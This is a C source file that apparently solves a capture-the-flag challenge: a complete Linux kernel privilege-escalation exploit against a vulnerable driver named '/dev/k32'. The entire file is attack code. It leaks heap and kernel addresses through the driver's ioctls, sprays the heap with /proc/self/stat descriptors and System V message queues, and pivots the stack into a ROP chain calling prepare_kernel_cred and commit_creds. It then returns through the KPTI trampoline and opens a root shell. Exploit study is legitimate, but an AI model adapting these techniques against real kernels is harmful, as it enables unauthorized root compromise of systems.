#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <math.h>
#include <sys/msg.h>
#include <stdint.h>
#include <sys/xattr.h>

#define DEVICE        "/dev/k32"
#define KCREATE       0xb10500aU
#define KFREE         0xb10500bU
#define KREAD         0xb10500cU
#define KWRITE        0xb10500dU

#define SPRAY_SZ      0x200
#define MSG_SPRAY_SZ  0x20

typedef struct
{
    char *buf;
    uint8_t size;
    uint32_t idx;
} req_t;

int dfd;
int pfd[SPRAY_SZ];
int mid[MSG_SPRAY_SZ];
unsigned long user_cs, user_ss, user_sp, user_rflags;
unsigned long base, heap, buf;
unsigned long prepare_kernel_cred, commit_creds, kpti_trampoline, pop_rdi, init_cred;
unsigned long ret, gadg1, gadg2, pop_rax, pivot, xchg_rdi_rax;

unsigned long *payload;

char tmp[0x10];

req_t *req;

void error(char *msg)
{
    printf("[-] %s\n", msg);
    exit(-1);
}

void success(char *msg)
{
    printf("[+] %s\n", msg);
}

void info(char *msg)
{
    printf("[*] %s\n", msg);
}

void save_state(void)
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    success("Saved state!");
}

void open_device(void)
{
    dfd = open(DEVICE, O_RDWR);
    if (dfd < 0)
        error("Failed to open device :C");
    success("Opened device");
    return;
}

void k32_create()
{
    req->size = 0xee;
    if (ioctl(dfd, KCREATE, req))
        error("k32_add failed!");
}

void k32_delete(uint32_t idx)
{
    req->idx = idx;
    if (ioctl(dfd, KFREE, req))
        error("k32_delete failed!");
}

void k32_read(uint32_t idx, char *buf, uint8_t size)
{
    req->idx = idx;
    req->buf = buf;
    req->size = size;
    if (ioctl(dfd, KREAD, req))
        error("k32_read failed!");
}

void k32_write(uint32_t idx, char *buf, uint8_t size)
{
    req->idx = idx;
    req->buf = buf;
    req->size = size;
    if (ioctl(dfd, KWRITE, req))
        error("k32_write failed!");
}

void spray(void)
{
    char buf[0x20];
    memset(buf, 0x31, 0x20);
    k32_create();
    for (int i = 0; i < SPRAY_SZ; i++)
        pfd[i] = open("/proc/self/stat", O_RDONLY);
    success("Sprayed heap!");
}

unsigned long leak_heap(void)
{
    unsigned long dump[4];

    k32_create();
    k32_read(0, (char *)(dump), 0x20);
    for (int i = 1; i < 6; i++)
        k32_create();

    return (dump[2] / 0x1000) * 0x1000;
}

unsigned long leak_base(void)
{
    unsigned long dump[5];
    k32_read(6, (char *)(&dump), 0x28);

    return dump[4] - 0x1aa471;
}

void calculate_offsets(void)
{
    gadg1 = base + 0x1931e;  // ret 0x148
    gadg2 = base + 0x2af875; // add rsp, 0x40 ; ret
    pivot = base + 0x6050c;
    commit_creds = base + 0x6de51;
    kpti_trampoline = base + 0x600e10 + 49;
    prepare_kernel_cred = base + 0x6e045;
    pop_rdi = base + 0x12352e;
    init_cred = base + 0xe54500;
    xchg_rdi_rax = base + 0xef31f;
    return;
}

void gib_shell(void)
{
    success("Returned to userland!");
    printf("[#] Current UID => %d\n", getuid());

    execve("/bin/bash", NULL, NULL);
    exit(0);
}

void prepare_payload(void)
{

    payload = malloc(0x1000);
    memset(payload, 0, 0x100);
    int i = 0;

    payload[i++] = 1;
    payload[i++] = pop_rdi;
    payload[i++] = 0;
    payload[i++] = prepare_kernel_cred;
    payload[i++] = pop_rdi;
    payload[i++] = heap;
    payload[i++] = xchg_rdi_rax;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0x0; // dummy rax
    payload[i++] = 0x0; // dummy rdi
    payload[i++] = (unsigned long)gib_shell;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;

    for (int s = 0; s < MSG_SPRAY_SZ; s++)
    {
        mid[s] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (mid[s] == -1)
            error("msgget failed!");

        for (int j = 0; j < 4; j++)
        {
            if (msgsnd(mid[s], payload, 0x1000, 0))
                error("msgsnd failed!");
        }
    }
}

void attack(void)
{
    memset(payload,0x0,0x100);
    payload[4] = gadg1;
    payload[5] = gadg2;
    k32_write(6, (char *)(payload), 0x30);

    info("Triggering attack");
    for (int i = 0; i < SPRAY_SZ; i++)
    {
        register unsigned long r14 asm("r14");
        register unsigned long r13 asm("r13");

        r14 = pivot;
        r13 = heap + 0x59000 + 0x30;

        read(pfd[i], tmp, 0x10);
    }
}

int main()
{
    save_state();
    req = (req_t *)malloc(sizeof(req_t));
    open_device();
    heap = leak_heap();
    printf("[*] Heap => %#lx\n", heap);
    spray();
    base = leak_base();
    printf("[*] Kernel base => %#lx\n", base);
    calculate_offsets();
    prepare_payload();
    attack();
}